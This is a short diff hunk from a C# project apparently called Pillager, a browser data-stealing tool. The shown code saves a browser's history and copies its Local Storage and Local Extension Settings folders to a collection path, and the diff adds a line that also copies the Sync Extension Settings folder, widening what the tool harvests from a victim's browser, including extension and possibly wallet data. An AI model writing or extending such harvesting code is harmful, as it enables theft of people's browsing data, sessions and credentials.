@@ -218,6 +218,7 @@ namespace Pillager.Browsers
             if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
             if (Directory.Exists(Path.Combine(BrowserPath, "Local Storage"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Local Storage"), Path.Combine(savepath, "Local Storage"), true);
             if (Directory.Exists(Path.Combine(BrowserPath, "Local Extension Settings"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Local Extension Settings"), Path.Combine(savepath, "Local Extension Settings"), true);
+            if (Directory.Exists(Path.Combine(BrowserPath, "Sync Extension Settings"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Sync Extension Settings"), Path.Combine(savepath, "Sync Extension Settings"), true);
         }
     }
 }
